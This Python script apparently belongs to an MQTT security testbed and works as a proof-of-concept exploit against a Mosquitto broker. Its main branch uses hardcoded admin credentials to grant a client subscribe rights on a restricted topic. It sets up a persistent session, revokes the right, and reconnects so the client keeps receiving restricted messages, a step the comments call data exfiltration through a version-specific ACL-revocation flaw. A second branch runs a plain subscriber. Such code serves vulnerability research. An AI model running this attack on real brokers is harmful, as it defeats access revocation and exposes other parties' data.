import paho.mqtt.client as mqtt
import time
import mqtt_utilities as util

# Define MQTT broker details
a_username = "myadmin"
a_password = "pass123"
broker = "10.0.0.1"
port = 1883
restricted_topic = "test/topic2"
subscribe_topic = "test/topic1"
username = "client1"
password = "pass1"
reconnect_delay = 10
connection = util.Connection_status()
a_connection = util.Connection_status()
local_ip = util.get_local_ip()


def on_message(client, userdata, message):
    r_message = message.payload.decode('utf-8')
    print(f"Received message: " + r_message, flush=True)
    with open("mqtt_sub.log", 'a') as log:
        log.write("Elaborated message: "+r_message+"\n")


def on_connect(client, userdata, flags, reason_code, properties):
    if reason_code == 0:
        print("Connected successfully.\tReason code: " +
              str(reason_code)+"\tSession present: "+str(flags.session_present), flush=True)
        userdata.connected = True
        if not flags.session_present:
            print("Resubscribing to topics...", flush=True)
            client.subscribe(subscribe_topic)
    else:
        print("Connection failed.\tReason code: " +
              str(reason_code), flush=True)
        userdata.connected = False


# setting the durable client for data exfiltration
if local_ip == "10.0.0.7":

    # send message to $CONTROL/dynamic-security/v1 topic to change ACLs for client1
    print("Connecting to broker as admin to add subscribe rights in test/topic2 for client1...", flush=True)
    not_reachable = True
    while not_reachable:
        admin_client = mqtt.Client(
            mqtt.CallbackAPIVersion.VERSION2, userdata=a_connection)
        admin_client.username_pw_set(a_username, a_password)
        admin_client.on_connect = util.on_connect
        admin_client.on_disconnect = util.on_disconnect
        admin_client.on_publish = util.on_publish
        if util.connect_client(admin_client, a_connection, reconnect_delay):
            print(
                "Sending admin message to add subscribe rights in test/topic2 for client1...", flush=True)
            admin_client.publish("$CONTROL/dynamic-security/v1",
                                 '{"commands": [{"command": "addRoleACL", "rolename": "roleClient", "acltype": "subscribeLiteral", "topic": "test/topic2", "priority": 0, "allow": true}]}')
            time.sleep(3)
            not_reachable = False
        else:
            print(f"Retrying admin connection in {reconnect_delay} seconds...")
            time.sleep(reconnect_delay)

    while True:

        # initialize the durable client
        client = mqtt.Client(
            mqtt.CallbackAPIVersion.VERSION2, userdata=connection, protocol=mqtt.MQTTv5, client_id="durable_client")
        client.username_pw_set(username, password)
        client.on_connect = util.on_connect
        client.on_subscribe = util.on_subscribe
        client.on_unsubscribe = util.on_unsubscribe
        client.on_message = on_message
        client.on_disconnect = util.on_disconnect
        properties = mqtt.Properties(mqtt.PacketTypes.CONNECT)
        properties.SessionExpiryInterval = 10000

        # connect the durable client to the broker
        print("Connecting client1 to the broker...", flush=True)
        if util.connect_client(client, connection, reconnect_delay, input_clean_start=False, input_properties=properties):

            # the durable clients subscribes to the desired topics and then disconnects
            print("Subscribing client1 to restricted and normal topic...", flush=True)
            client.subscribe([(restricted_topic, 0), (subscribe_topic, 0)])
            time.sleep(3)
            print("Disconnecting client1 from the broker...", flush=True)
            client.disconnect()
            time.sleep(3)

            # revoke the permission when the durable client is disconnected
            print(
                "Sending admin message to remove subscribe rights in test/topic2 for client1...", flush=True)
            admin_client.publish("$CONTROL/dynamic-security/v1",
                                 '{"commands": [{"command": "removeRoleACL", "rolename": "roleClient", "acltype": "subscribeLiteral", "topic": "test/topic2"}]}')
            time.sleep(3)
            print("Disconnecting admin...", flush=True)
            admin_client.disconnect()
            time.sleep(3)

            # reconnect the durable client
            while True:
                print("Reconnecting client1 to the broker...", flush=True)
                if util.connect_client(client, connection, reconnect_delay, input_clean_start=False, input_properties=properties):
                    print("Beginning to process messages", flush=True)
                    # remove the previous dynsec command or change it to not affect the client and add subscribe to restricted_topic if mosquitto version is not affected by vulnerability
                    time.sleep(1000)
                    break
                else:
                    print(
                        f"Retrying connection in {reconnect_delay} seconds...", flush=True)
                    time.sleep(reconnect_delay)
            break
        else:
            print(
                f"Retrying connection in {reconnect_delay} seconds...", flush=True)
            time.sleep(reconnect_delay)


# normal subscribers
else:

    while True:
        client = mqtt.Client(
            mqtt.CallbackAPIVersion.VERSION2, userdata=connection, protocol=mqtt.MQTTv5)
        client.username_pw_set(username, password)
        client.on_connect = on_connect
        client.on_subscribe = util.on_subscribe
        client.on_unsubscribe = util.on_unsubscribe
        client.on_message = on_message
        client.on_disconnect = util.on_disconnect
        if util.connect_client(client, connection, reconnect_delay):
            print("Beginning to process messages", flush=True)
            time.sleep(1000)
            client.unsubscribe(subscribe_topic)
            break
        else:
            print(
                f"Retrying connection in {reconnect_delay} seconds...", flush=True)
            time.sleep(reconnect_delay)
